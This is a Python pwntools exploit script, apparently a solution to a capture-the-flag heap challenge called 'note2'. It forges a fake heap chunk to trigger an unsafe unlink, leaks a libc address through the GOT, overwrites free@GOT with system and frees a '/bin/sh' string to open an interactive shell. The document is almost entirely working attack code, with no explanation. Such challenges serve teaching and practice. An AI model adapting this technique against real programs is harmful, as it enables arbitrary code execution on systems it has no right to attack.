from pwn import *
from LibcSearcher import LibcSearcher
# elf = ELF("./libc.so.6")
p = process("./note2")
elf = ELF("./note2")
# context.log_level = "debug"

p.sendlineafter(":\n" , "fantasy")
p.sendlineafter(":\n" , "fantasy")

def add(size , content):
	p.sendlineafter(">>\n" , "1")
	p.sendlineafter("128)\n" , str(size))
	p.sendlineafter("content:\n" , content)
	p.recvuntil("the id is ")
	# print p.recv(2) + "-------" + content


def edit(id , choice , new_content): # 1 overwrite 2 append
	p.sendlineafter(">>\n" , "3")
	p.sendlineafter("note:" , str(id))
	p.sendlineafter("append]\n" , str(choice))	
	p.sendlineafter("Contents:" , new_content)

def delete(id):
	p.sendlineafter(">>\n" , "4")
	p.sendlineafter("note:\n" , str(id))

def show(id):
	p.sendlineafter(">>\n" , "2")
	p.sendlineafter("note:\n" , str(id))
	# print p.recv()
	p.recvuntil("is ")
	text = p.recvuntil("\n" , drop = "")
	return text[:-1]
	
size = 0x50
next_size = 0x80
target_addr = 0x602120 

fake_chunk =  "a" * 8 + p64(size) + p64(target_addr - 0x18 ) + p64(target_addr - 0x10)
fake_chunk =  fake_chunk.ljust(size , "b")
fake_chunk += p64(size)

add(next_size , fake_chunk)	
add(0 , "123") # need this chunk  addr < overwrited chunk # id 1
add(next_size , "wait overwrite") # id 2
# gdb.attach(p , "b puts")
delete(1) # free for overwrite
add(0 , "a" * 8 * 2 + p64(0xa0) + p64(0x90))

delete(2) # free to unlink # note_list_content[0] = note_list_content - 0x18
# gdb.attach(p , "b puts")
# raw_input("gdb:")
free_got = elf.got["free"]
puts_got = elf.got["puts"]
edit(0 , 1 , "a" * 8 * 3 + p64(target_addr + 0x8)) #note_list_content[0] = note_list_content + 0x8
edit(0 , 1 , p64(puts_got))
puts_addr = show(1) # temp
puts_addr = u64(puts_addr.ljust(8 , "\x00")) # value

# libc = LibcSearcher("puts" , puts_addr)
# libc_base = puts_addr - libc.dump("puts")
# system = libc_base + libc.dump("system")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = puts_addr - libc.sym["puts"]
system = libc_base + libc.sym["system"]
str_bin_sh = libc_base + libc.search("/bin/sh\x00").next()
def log(x,y):
	print(x + " : " + hex(y))
log("libc_base" , libc_base)
log("puts" , puts_addr)
log("system" , system)
log("str_bin_sh" , str_bin_sh)

edit(0 , 1 , p64(free_got))
edit(1 , 1 , p64(system)[:7]) # *free_got = system 
edit(0 , 1 , p64(str_bin_sh)) # note_list_content[1] = str_bin_sh
delete(1)

p.interactive()



